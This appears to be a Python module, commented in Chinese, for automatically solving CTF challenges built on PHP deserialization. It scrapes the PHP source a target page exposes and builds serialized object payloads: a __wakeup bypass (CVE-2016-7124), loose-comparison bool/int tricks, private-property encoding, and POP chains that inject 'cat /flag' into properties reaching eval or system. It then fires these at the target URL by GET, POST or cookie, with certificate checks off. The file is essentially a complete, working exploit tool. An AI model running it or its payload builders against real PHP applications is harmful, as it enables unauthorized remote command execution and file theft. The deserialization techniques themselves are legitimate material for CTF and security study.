# -*- coding: utf-8 -*-
"""
PHP Unserialize Solver — CTF 通用 PHP 反序列化题型求解引擎 v1.0

支持的题型变体:
  1. 基础验证 — 构造对象 → 属性赋值 → 通过 if($obj->check()) 验证
  2. __wakeup 绕过 (CVE-2016-7124) — 属性计数 > 实际数量 → 跳过 __wakeup
  3. == 弱类型绕过 — bool/int 值绕过松散比较
  4. private/protected 属性 — \0ClassName\0prop 编码
  5. POP 链 (简单) — __destruct → 方法调用 → RCE/文件读取
  6. 多入口 — GET/POST/COOKIE 自动识别
  7. 错误反馈学习 — 根据错误类型自动切换策略
"""

import re
import urllib.request
import urllib.parse
import urllib.error
import ssl
import html as _html_mod
from typing import Dict, List, Optional, Tuple, Callable, Any


# ═══════════════════════════════════════════════════════════
#  Flag 正则
# ═══════════════════════════════════════════════════════════

_FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,}\{[^}]{3,}\}')
_BAD_HTML = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|<br|<span|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')


def find_flag(text: str) -> Optional[str]:
    if not text:
        return None
    for m in _FLAG_RE.finditer(text):
        candidate = m.group(0)
        if not _BAD_HTML.search(candidate):
            return candidate
    return None


# ═══════════════════════════════════════════════════════════
#  HTTP 工具
# ═══════════════════════════════════════════════════════════

def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _headers():
    return {"User-Agent": "Mozilla/5.0 Yang-Web PHP-Unserialize/1.0"}


def http_get(url: str, timeout: int = 10):
    try:
        req = urllib.request.Request(url, headers=_headers())
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as resp:
            return resp.status, resp.read(), dict(resp.getheaders())
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if e.fp else b""), dict(e.headers) if hasattr(e, 'headers') else {}
    except Exception:
        return None, b"", {}


def http_post(url: str, data: bytes, timeout: int = 10):
    try:
        req = urllib.request.Request(url, data=data, headers={**_headers(), "Content-Type": "application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as resp:
            return resp.status, resp.read(), dict(resp.getheaders())
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if e.fp else b""), dict(e.headers) if hasattr(e, 'headers') else {}
    except Exception:
        return None, b"", {}


def decode_body(raw: bytes) -> str:
    for enc in ["utf-8", "gbk", "gb2312", "latin-1"]:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", errors="replace")


# ═══════════════════════════════════════════════════════════
#  源码清洗 + 检测
# ═══════════════════════════════════════════════════════════

def _detect_php_source(text: str) -> bool:
    """检测响应文本是否包含 PHP 源码（含 highlight_file HTML 高亮）。"""
    if not text:
        return False
    if '<?php' in text or '<?=' in text:
        return True
    if '&lt;?php' in text or '&lt;?=' in text:
        return True
    for kw in ['function ', 'function&nbsp;', 'preg_match', 'highlight_file',
               'class ', 'class&nbsp;', 'system(', 'isset(', 'die(', 'die&nbsp;',
               'unserialize']:
        if kw in text:
            return True
    return False


def _clean_php_source(text: str) -> str:
    """清洗 highlight_file 输出的 HTML → 纯 PHP 源码文本。"""
    clean = text
    clean = clean.replace('&lt;', '<').replace('&gt;', '>')
    clean = clean.replace('&nbsp;', ' ').replace('&amp;', '&')
    clean = clean.replace('<br />', '\n').replace('<br>', '\n')
    clean = clean.replace('&#39;', "'").replace('&quot;', '"')
    clean = clean.replace('&quot;', '"')
    clean = re.sub(r'<[^>]+>', '', clean)
    return clean


# ═══════════════════════════════════════════════════════════
#  策略枚举
# ═══════════════════════════════════════════════════════════

class Strategy:
    """绕过策略定义。"""
    BASIC = "basic"               # 标准属性值
    WAKEUP_BYPASS = "wakeup"      # CVE-2016-7124: 属性计数溢出
    LOOSE_BOOL = "loose_bool"     # == 弱比对 → bool true 绕过
    LOOSE_INT = "loose_int"       # == 弱比对 → int 0 绕过
    PRIVATE_PROPS = "private"     # 强制 private 属性编码
    TYPE_ARRAY = "type_array"     # 用 array 替代 string（绕过 strcmp 等）
    POP_CHAIN = "pop_chain"       # __destruct → method 链


# ═══════════════════════════════════════════════════════════
#  PHP Class 解析器
# ═══════════════════════════════════════════════════════════

def _extract_brace_block(source: str, start: int) -> str:
    """从 start 位置起，提取 {} 配对的内容。"""
    depth = 1
    i = start
    while i < len(source) and depth > 0:
        if source[i] == '{':
            depth += 1
        elif source[i] == '}':
            depth -= 1
        i += 1
    return source[start:i-1]


def parse_php_classes(source: str) -> Dict[str, dict]:
    """解析 PHP 源码中的所有 class 定义。

    Returns:
        {class_name: {
            properties: {name: {visibility, default_value}},
            methods: [{name, params, body, is_magic, calls_to}],
            has_wakeup: bool,
            has_destruct: bool,
            has_tostring: bool,
        }}
    """
    classes = {}
    for m in re.finditer(r'class\s+(\w+)\s*\{', source):
        class_name = m.group(1)
        class_body = _extract_brace_block(source, m.end())

        # ── 解析属性 ──
        properties = {}
        for pm in re.finditer(r'(var|public|private|protected)\s+\$(\w+)\s*(?:=\s*([^;]+))?\s*;', class_body):
            visibility = pm.group(1)
            prop_name = pm.group(2)
            default = pm.group(3)
            if default:
                default = default.strip().strip("'").strip('"')
            properties[prop_name] = {'visibility': visibility, 'default': default}

        # ── 解析方法 ──
        methods = []
        has_wakeup = has_destruct = has_tostring = False
        for mm in re.finditer(r'function\s+(\w+)\s*\(([^)]*)\)\s*\{', class_body):
            method_name = mm.group(1)
            params = mm.group(2)
            method_body = _extract_brace_block(class_body, mm.end())

            # 检测魔术方法
            is_magic = method_name.startswith('__')
            if method_name == '__wakeup':
                has_wakeup = True
            elif method_name == '__destruct':
                has_destruct = True
            elif method_name == '__toString':
                has_tostring = True

            # 分析方法内的调用链
            calls_to = []
            for cm in re.finditer(r'\$this->(\w+)\s*\(', method_body):
                calls_to.append(cm.group(1))

            # 分析方法体内的危险操作
            dangerous = []
            for dm in re.finditer(r'(system|exec|shell_exec|passthru|eval|assert|'
                                   r'file_get_contents|include|require|'
                                   r'file_put_contents|unlink)\s*\(', method_body):
                dangerous.append(dm.group(1))

            methods.append({
                'name': method_name,
                'params': params,
                'body': method_body,
                'is_magic': is_magic,
                'calls_to': calls_to,
                'dangerous': dangerous,
            })

        classes[class_name] = {
            'properties': properties,
            'methods': methods,
            'has_wakeup': has_wakeup,
            'has_destruct': has_destruct,
            'has_tostring': has_tostring,
        }

    return classes


# ═══════════════════════════════════════════════════════════
#  入口参数解析
# ═══════════════════════════════════════════════════════════

def parse_unserialize_input(source: str) -> Optional[dict]:
    """解析 unserialize() 的输入向量。

    Returns: {method: GET|POST|COOKIE|REQUEST, param: str} or None
    """
    # 模式 1: $var = unserialize($_GET['param']);
    m = re.search(r'\$(\w+)\s*=\s*unserialize\s*\(\s*\$_(GET|POST|COOKIE|REQUEST)\[["\'](\w+)["\']', source)
    if m:
        return {'method': m.group(2), 'param': m.group(3)}

    # 模式 2: unserialize($_POST['data']) 直接调用
    m = re.search(r'unserialize\s*\(\s*\$_(GET|POST|COOKIE|REQUEST)\[["\'](\w+)["\']', source)
    if m:
        return {'method': m.group(1), 'param': m.group(2)}

    # 模式 3: $data = $_GET['data']; unserialize($data);
    m = re.search(r'\$(\w+)\s*=\s*\$_(GET|POST|COOKIE|REQUEST)\[["\'](\w+)["\']\][\s\S]{0,30}unserialize\s*\(\s*\$\1', source)
    if m:
        return {'method': m.group(2), 'param': m.group(3)}

    return None


# ═══════════════════════════════════════════════════════════
#  条件分析 — 推断目标属性值
# ═══════════════════════════════════════════════════════════

def analyze_check_conditions(class_info: dict, source: str) -> Dict[str, List[Tuple[str, str, Any]]]:
    """分析类中验证方法的条件，推断需要的属性值。

    Returns: {prop_name: [(operator, comparison_value, method_name), ...]}
    operator: '==' | '===' | '!=' | '!=='
    """
    conditions = {}

    for method in class_info.get('methods', []):
        method_name = method['name']
        body = method['body']

        # 跳过构造函数和其他不相关魔术方法
        if method_name in ('__construct', '__sleep', '__serialize', '__unserialize'):
            continue

        # 模式 1: $this->prop == "value"
        for cm in re.finditer(r'\$this->(\w+)\s*(={2,3}|!=={0,1})\s*["\']([^"\']*)["\']', body):
            prop = cm.group(1)
            op = cm.group(2)
            val = cm.group(3)
            conditions.setdefault(prop, []).append((op, val, method_name))

        # 模式 2: $this->prop == 数字
        for cm in re.finditer(r'\$this->(\w+)\s*(={2,3}|!=={0,1})\s*(\d+)', body):
            prop = cm.group(1)
            op = cm.group(2)
            val = int(cm.group(3))
            conditions.setdefault(prop, []).append((op, val, method_name))

    # 如果方法中没有找到，在整个 class body 中搜索
    if not conditions:
        for cm in re.finditer(r'\$this->(\w+)\s*(={2,3}|!=={0,1})\s*["\']([^"\']*)["\']',
                              class_info.get('raw_body', source)):
            prop = cm.group(1)
            op = cm.group(2)
            val = cm.group(3)
            conditions.setdefault(prop, []).append((op, val, 'global'))

    return conditions


def determine_target_values(conditions: Dict) -> Dict[str, str]:
    """从条件集合推断目标值（取第一个 == 匹配）。

    如果是 == 弱比对，标记为可绕过。
    """
    targets = {}
    for prop, conds in conditions.items():
        for op, val, _ in conds:
            if op == '==':
                targets[prop] = val
                break
            elif op == '===':
                targets[prop] = val
                break
    return targets


# ═══════════════════════════════════════════════════════════
#  序列化 Payload 生成器
# ═══════════════════════════════════════════════════════════

def _build_prop_entry(prop: str, val, visibility: str = 'public',
                       class_name: str = '', strategy: str = 'basic',
                       n_props_override: Optional[int] = None) -> str:
    """构建单个属性的序列化条目。

    处理策略:
    - basic: 标准字符串序列化
    - wakeup: 不修改属性值，由外部控制属性计数
    - loose_bool: 将字符串值替换为 bool(true)
    - loose_int: 将字符串值替换为 int(0)
    - private: 强制 private 编码
    """
    # 确定属性名编码
    if visibility == 'private':
        encoded = f'\x00{class_name}\x00{prop}'
    elif visibility == 'protected':
        encoded = f'\x00*\x00{prop}'
    else:
        encoded = prop

    # 确定值
    if strategy == 'loose_bool' and isinstance(val, str):
        return f's:{len(encoded)}:"{encoded}";b:1;'
    elif strategy == 'loose_int' and isinstance(val, str):
        return f's:{len(encoded)}:"{encoded}";i:0;'
    elif isinstance(val, bool):
        return f's:{len(encoded)}:"{encoded}";b:{"1" if val else "0"};'
    elif isinstance(val, int):
        return f's:{len(encoded)}:"{encoded}";i:{val};'
    elif isinstance(val, str):
        return f's:{len(encoded)}:"{encoded}";s:{len(val)}:"{val}";'
    else:
        sval = str(val)
        return f's:{len(encoded)}:"{encoded}";s:{len(sval)}:"{sval}";'


def build_payload(class_name: str, targets: Dict[str, Any],
                   class_info: dict = None, strategy: str = 'basic') -> Optional[str]:
    """构建 PHP 序列化 payload。

    Args:
        class_name: 类名
        targets: {prop: value} 目标属性值
        class_info: 类信息（含 visibility）
        strategy: 绕过策略

    Returns:
        序列化字符串，如 O:7:"mylogin":2:{...}
    """
    if not targets:
        return None

    props_entries = []
    for prop, val in targets.items():
        visibility = 'public'
        if class_info:
            pinfo = class_info.get('properties', {}).get(prop, {})
            visibility = pinfo.get('visibility', 'public')
        entry = _build_prop_entry(prop, val, visibility, class_name, strategy)
        props_entries.append(entry)

    n_props = len(targets)
    if strategy == 'wakeup':
        n_props += 1  # CVE-2016-7124: 属性数量 +1 绕过 __wakeup

    props_str = ''.join(props_entries)
    return f'O:{len(class_name)}:"{class_name}":{n_props}:{{{props_str}}}'


# ═══════════════════════════════════════════════════════════
#  Payload 发送
# ═══════════════════════════════════════════════════════════

def send_payload(url: str, param_info: dict, payload: str,
                  timeout: int = 10) -> Tuple[Optional[str], Optional[str]]:
    """发送反序列化 payload，返回 (response_text, error_hint)。

    error_hint 用于错误反馈学习:
        'unserialize_failed' — payload 格式错误，返回了 bool
        'wakeup_fired' — __wakeup 被执行（可能是需要绕过）
        'wrong_values' — 反序列化成功但验证未通过
        'success' — 拿到 flag 或正面响应
    """
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    method = param_info.get('method', 'GET')
    param = param_info.get('param', 'param')

    try:
        if method in ('GET', 'REQUEST'):
            test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
            code, body, _ = http_get(test_url, timeout=timeout)
        elif method == 'POST':
            data = f"{param}={urllib.parse.quote(payload)}".encode()
            code, body, _ = http_post(base, data, timeout=timeout)
        elif method == 'COOKIE':
            req = urllib.request.Request(base, headers={**_headers(), 'Cookie': f"{param}={urllib.parse.quote(payload)}"})
            with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as resp:
                return decode_body(resp.read()), None
        else:
            return None, 'unknown_method'

        if not body:
            return None, 'no_response'

        text = decode_body(body)

        # ── 错误分析 ──
        if 'Call to a member function' in text and 'on bool' in text:
            return text, 'unserialize_failed'
        if 'bad requests' in text.lower() or 'wakeup' in text.lower():
            return text, 'wakeup_fired'
        if 'Fatal error' in text and 'bool' not in text:
            return text, 'fatal_error'
        if 'Call to a member function' in text and 'on null' in text:
            return text, 'null_object'

        flag = find_flag(text)
        if flag:
            return text, 'flag_found'

        # 检查是否有正面响应（不是单纯返回源码）
        if '<?php' not in text and '&lt;?php' not in text and len(text) > 5:
            return text, 'success'

        return text, 'wrong_values'

    except urllib.error.HTTPError as e:
        if e.fp:
            return decode_body(e.read()), 'http_error'
        return None, 'http_error'
    except Exception as e:
        return None, str(e)[:80]


# ═══════════════════════════════════════════════════════════
#  主求解器
# ═══════════════════════════════════════════════════════════

class PHPUnserializeSolver:
    """通用 PHP 反序列化 CTF 题型求解器。

    用法:
        solver = PHPUnserializeSolver()
        result = solver.solve("http://target.com/", on_progress=callback)
    """

    # 策略执行顺序（按成本从低到高）
    STRATEGY_ORDER = [
        Strategy.BASIC,
        Strategy.WAKEUP_BYPASS,
        Strategy.LOOSE_BOOL,
        Strategy.LOOSE_INT,
        Strategy.PRIVATE_PROPS,
    ]

    def __init__(self):
        self.debug = []

    def _log(self, msg: str):
        self.debug.append(msg)

    def solve(self, url: str, on_progress=None, on_found=None,
               source_text: str = None) -> Optional[dict]:
        """主入口：自动检测并利用 PHP 反序列化漏洞。

        Args:
            url: 目标 URL
            on_progress: Callable(stage, item, status)
            on_found: Callable(flag)
            source_text: 预获取的页面源码（可选，避免重复请求）

        Returns:
            {'flag': str, 'class': str, 'strategy': str, 'payload': str} or None
        """
        def emit(stage, item, status):
            self._log(f"[{stage}] {item}: {status}")
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        emit('unserialize', '开始检测', 'PHP反序列化通用求解器 v1.0')

        # ── Step 1: 获取页面源码 ──
        if source_text is None:
            emit('unserialize', '获取页面', url)
            code, body, _ = http_get(url)
            if not body:
                emit('unserialize', '失败', '无法获取页面')
                return None
            source_text = decode_body(body)

        # ── Step 2: 检测 PHP 源码 ──
        if not _detect_php_source(source_text):
            emit('unserialize', '跳过', '页面不包含PHP源码')
            return None

        # ── Step 3: 清洗源码 ──
        clean = _clean_php_source(source_text)

        # ── Step 4: 检测 unserialize() ──
        if 'unserialize' not in clean:
            emit('unserialize', '跳过', '源码中无unserialize()调用')
            return None

        emit('unserialize', '检测到', 'unserialize() 调用')

        # ── Step 5: 解析入口参数 ──
        param_info = parse_unserialize_input(clean)
        if not param_info:
            param_info = {'method': 'GET', 'param': 'param'}
            emit('unserialize', '参数推断', 'fallback → GET[param]')
        else:
            emit('unserialize', '入口', f"$_{param_info['method']}['{param_info['param']}']")

        # ── Step 6: 解析 class 定义 ──
        classes = parse_php_classes(clean)
        if not classes:
            emit('unserialize', '跳过', '未找到class定义')
            return None

        emit('unserialize', '解析类', f"{len(classes)} 个: {', '.join(classes.keys())}")

        # ── Step 7: 分析每个类 → 目标值 → 组合策略 → 尝试攻击 ──
        for class_name, class_info in classes.items():
            emit('unserialize', '分析类', f'{class_name} ({len(class_info["methods"])} methods, '
                  f'wakeup={class_info["has_wakeup"]}, destruct={class_info["has_destruct"]})')

            conditions = analyze_check_conditions(class_info, clean)
            targets = determine_target_values(conditions)

            if targets:
                emit('unserialize', '目标值', f'{class_name}: {targets}')

            # ── 确定该尝试哪些策略 ──
            strategies = self._select_strategies(class_info, targets)

            emit('unserialize', '策略队列', f'[{", ".join(strategies)}]')

            for strategy in strategies:
                if strategy == Strategy.BASIC and not targets:
                    continue
                if strategy in (Strategy.LOOSE_BOOL, Strategy.LOOSE_INT) and not targets:
                    continue

                sname = strategy

                # 构建 payload
                if strategy == Strategy.POP_CHAIN:
                    payload = self._build_pop_chain(class_name, class_info, clean)
                else:
                    payload = build_payload(class_name, targets or {}, class_info, sname)

                if not payload:
                    emit('unserialize', '跳过策略', f'{class_name}/{sname}: 无法构建payload')
                    continue

                emit('unserialize', '尝试策略', f'{class_name}/{sname}: {payload[:100]}')

                # 发送
                rtext, hint = send_payload(url, param_info, payload)

                if hint == 'flag_found':
                    flag = find_flag(rtext)
                    emit('unserialize', 'FLAG!', f'{class_name}/{sname}: {flag}')
                    if on_found:
                        try:
                            on_found(flag)
                        except Exception:
                            pass
                    return {
                        'flag': flag,
                        'class': class_name,
                        'strategy': sname,
                        'payload': payload,
                        'vuln_confirmed': [{
                            'type': 'php_unserialize',
                            'class': class_name,
                            'strategy': sname,
                            'param': param_info['param'],
                        }],
                    }

                # 错误反馈 → 记录以便后续调整
                emit('unserialize', '策略结果', f'{class_name}/{sname}: {hint}')

                # 如果是 unserialize 格式错误 → 跳过此类（无法识别正确格式）
                if hint == 'unserialize_failed' and sname == 'basic':
                    emit('unserialize', '格式错误', f'{class_name}: 基础payload失败, 可能需要特殊编码')
                    # 不跳过，继续尝试 private_props 策略（可能是私有属性）
                    continue

            # ── 如果该类有 __destruct 且 target 已经满足 → 尝试 POP 链 ──
            if class_info['has_destruct'] and targets:
                pop_payload = self._build_pop_chain(class_name, class_info, clean)
                if pop_payload:
                    emit('unserialize', 'POP链', f'{class_name}: {pop_payload[:100]}')
                    rtext, hint = send_payload(url, param_info, pop_payload)
                    if hint == 'flag_found':
                        flag = find_flag(rtext)
                        emit('unserialize', 'FLAG!', f'{class_name}/POP: {flag}')
                        if on_found:
                            try:
                                on_found(flag)
                            except Exception:
                                pass
                        return {
                            'flag': flag,
                            'class': class_name,
                            'strategy': 'pop_chain',
                            'payload': pop_payload,
                            'vuln_confirmed': [{
                                'type': 'php_unserialize_pop',
                                'class': class_name,
                            }],
                        }

        emit('unserialize', '完成', '所有类和策略已尝试')
        return None

    def _select_strategies(self, class_info: dict, targets: dict) -> List[str]:
        """根据类特征，确定需要尝试的策略序列。

        规则:
        - 始终包含 basic
        - 有 __wakeup → 添加 wakeup 绕过
        - 有 == 弱比对 → 添加 loose_bool / loose_int
        - 有 private 属性 → 确保 private 编码
        """
        strategies = [Strategy.BASIC]

        if class_info.get('has_wakeup'):
            strategies.append(Strategy.WAKEUP_BYPASS)

        # 检查是否存在 == 弱比对条件
        has_loose = False
        for method in class_info.get('methods', []):
            body = method.get('body', '')
            if '==' in body and '===' not in body.replace(' ', ''):
                # 确认有 == 但无 ===
                real_loose = bool(re.search(r'(?<![!=])=(?!=)', body))
                if real_loose:
                    has_loose = True
                    break

        if has_loose:
            strategies.append(Strategy.LOOSE_BOOL)
            strategies.append(Strategy.LOOSE_INT)

        # 检查 private 属性
        has_private = any(
            p.get('visibility') == 'private'
            for p in class_info.get('properties', {}).values()
        )
        if has_private:
            strategies.append(Strategy.PRIVATE_PROPS)

        return strategies

    def _build_pop_chain(self, class_name: str, class_info: dict,
                         source: str) -> Optional[str]:
        """尝试构建简单的 POP 链 payload。

        模式 1: __destruct → $this->method()
        模式 2: __destruct → eval($this->prop)
        模式 3: __toString → $this->method()
        """
        for method in class_info.get('methods', []):
            if method['name'] != '__destruct' and method['name'] != '__toString':
                continue

            body = method['body']

            # 检查 __destruct 中是否有危险函数调用
            if method.get('dangerous'):
                # 如果有 eval($this->prop) 之类
                for dm in re.finditer(r'eval\s*\(\s*\$this->(\w+)', body):
                    prop = dm.group(1)
                    # 需要该属性可被控制
                    payload = self._build_dangerous_prop_payload(class_name, class_info, prop)
                    if payload:
                        return payload

                for dm in re.finditer(r'(system|exec|shell_exec|passthru)\s*\(\s*\$this->(\w+)', body):
                    func = dm.group(1)
                    prop = dm.group(2)
                    payload = self._build_dangerous_prop_payload(class_name, class_info, prop)
                    if payload:
                        return payload

                for dm in re.finditer(r'file_get_contents\s*\(\s*\$this->(\w+)', body):
                    prop = dm.group(1)
                    payload = self._build_dangerous_prop_payload(class_name, class_info, prop)
                    if payload:
                        return payload

            # 检查向其他对象方法的调用链
            for cm in re.finditer(r'\$this->(\w+)->(\w+)\s*\(', body):
                prop = cm.group(1)
                chain_method = cm.group(2)
                # 需要 prop 是另一个类的实例 → 探测源码中是否还有其他类
                # 简单情况: 直接连
                for other_class, other_info in parse_php_classes(source).items():
                    if other_class == class_name:
                        continue
                    for om in other_info.get('methods', []):
                        if om['name'] == chain_method and om.get('dangerous'):
                            # 构建跨类 POP 链
                            other_targets = {}
                            for op in other_info.get('properties', {}):
                                other_targets[op] = 'cat /flag'
                            inner = build_payload(other_class, other_targets, other_info, 'basic')
                            if inner:
                                props_str = f's:{len(prop)}:"{prop}";s:{len(inner)}:"{inner}";'
                                return f'O:{len(class_name)}:"{class_name}":1:{{{props_str}}}'

        return None

    def _build_dangerous_prop_payload(self, class_name: str, class_info: dict,
                                       prop: str) -> Optional[str]:
        """构建包含危险操作的属性 payload。

        常用于 __destruct → eval($this->cmd) → flag
        """
        targets = {}
        for pname in class_info.get('properties', {}):
            if pname == prop:
                targets[pname] = 'cat /flag*'
            else:
                targets[pname] = 'placeholder'
        return build_payload(class_name, targets, class_info, 'basic')


# ═══════════════════════════════════════════════════════════
#  便捷入口 — 供 url_analyzer.py 调用
# ═══════════════════════════════════════════════════════════

def auto_solve(url: str, on_progress=None, on_found=None,
                source_text: str = None) -> Optional[dict]:
    """一键求解 PHP 反序列化题型。

    等价于 PHPUnserializeSolver().solve(url, ...)
    """
    solver = PHPUnserializeSolver()
    return solver.solve(url, on_progress=on_progress, on_found=on_found,
                         source_text=source_text)
